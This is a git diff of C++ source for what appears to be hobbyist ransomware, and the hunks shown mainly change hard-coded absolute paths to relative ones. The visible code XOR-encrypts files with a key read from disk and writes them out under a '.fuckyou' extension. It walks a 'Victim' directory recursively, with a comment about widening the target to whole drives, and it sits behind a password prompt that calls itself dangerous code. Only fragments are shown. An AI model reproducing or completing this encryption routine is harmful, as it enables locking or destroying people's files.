@@ -24,7 +24,7 @@ string getListOfDrives() {    //vectors in C++ are like lists in Python
 
 void Xor(string const& Path) {
 	ifstream reader (Path, ios::in | ios::binary);
-	ifstream key_reader ("C:\\Users\\hp 650 G3\\Desktop\\Internet\\Hacking\\key.txt", ios::in | ios::binary);
+	ifstream key_reader ("Internet\\Hacking\\key.txt", ios::in | ios::binary);
 	ofstream writer (Path + ".fuckyou", ios::out | ios::binary);
 	char buffer [64], key [64];
 	key_reader >> key;
@@ -38,7 +38,7 @@ void Xor(string const& Path) {
 
 int main() {
 	//Security first
-	ifstream pass ("C:\\Users\\hp 650 G3\\Desktop\\Internet\\Hacking\\mdp.txt");
+	ifstream pass ("Internet\\Hacking\\mdp.txt");
 	string passwd, true_passwd;
 	cout << "This is a dangerous code (aka a **r**). Type the password so as to execute it. It's your last chance to come back." << endl;
 	cin >> passwd;
@@ -50,7 +50,7 @@ int main() {
 		exit(17);
 	}
 	//True code
-	string disk = "C:\\Users\\hp 650 G3\\Desktop\\Victim";  //getListOfDrives() or C: ????
+	string disk = "Victim";  //getListOfDrives() or C: ????
 	bool to_continue = true;
 	auto iter = fs::recursive_directory_iterator(disk);   // fs::directory_options::skip_permission_denied does not work at all. It's FAKE CODE
 	while(to_continue){
